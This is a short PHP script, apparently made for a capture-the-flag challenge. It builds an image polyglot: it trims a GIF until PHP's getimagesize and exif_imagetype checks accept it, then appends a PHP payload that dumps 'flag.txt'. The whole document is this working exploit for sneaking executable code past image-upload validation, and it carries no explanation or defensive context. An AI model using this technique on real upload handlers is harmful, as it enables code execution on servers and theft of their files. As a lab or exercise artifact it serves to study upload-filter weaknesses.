<?php
$orig_img="./POC.gif";
$tmp_img="./tmp.gif";
$payload="<?php var_dump(file_get_contents('flag.txt')) ?>";
$data=file_get_contents($orig_img);
for($i=1;$i<10000;$i++)
{
    $partial=substr($data,0,$i);
    file_put_contents($tmp_img,$partial);
    if(@getimagesize($tmp_img)!==false){
        if(@exif_imagetype($tmp_img)=== IMAGETYPE_GIF){
            echo "[+]done".$i."\n";
            file_put_contents($tmp_img,$payload,FILE_APPEND);
        break;
        }
        else{
            echo "[+]hacking in ".$i."\n";
        }
    }
    else{
        echo "[+]going on ".$i."\n";
    }
}